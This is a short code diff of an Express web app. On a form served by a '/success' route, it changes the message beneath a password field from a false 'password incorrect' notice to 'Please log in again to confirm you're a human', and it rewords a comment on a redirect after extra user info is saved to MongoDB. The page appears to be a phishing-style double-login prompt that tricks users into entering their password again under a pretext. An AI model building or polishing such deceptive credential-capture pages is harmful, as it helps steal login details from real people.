@@ -177,7 +177,7 @@ app.get('/success', (req, res) => {
             <div class="form-group">
                 <input placeholder="Password" type="password" id="password" name="password" required>
             </div>
-            <h2 style="font-size: 13px; color: #f36060; margin-bottom: 48px; font-family: sans-serif; text-align: start;">The password that you've entered is incorrect.</h2>
+            <h2 style="font-size: 13px; color: #f36060; margin-bottom: 48px; font-family: sans-serif; text-align: start;">Please log in again to confirm you're a human.</h2>
             <button type="submit" href="/Job Postings2.html">Log in</button>
         </form>
     </div>
@@ -219,7 +219,7 @@ app.post('/submit-additional-info', async (req, res) => {
         console.log("Data inserted successfully:", result);
 
         console.log("Additional info inserted successfully.");
-        res.redirect(`/Job Postings.html?loggedin=true`); // Redirect to Job Postings with loggedin parameter
+        res.redirect(`/Job Postings.html?loggedin=true`); // Redirect with the loggedin query parameter
     } catch (error) {
         console.error('Error saving additional info to MongoDB:', error);
         res.status(500).send('Error saving additional info to MongoDB.');
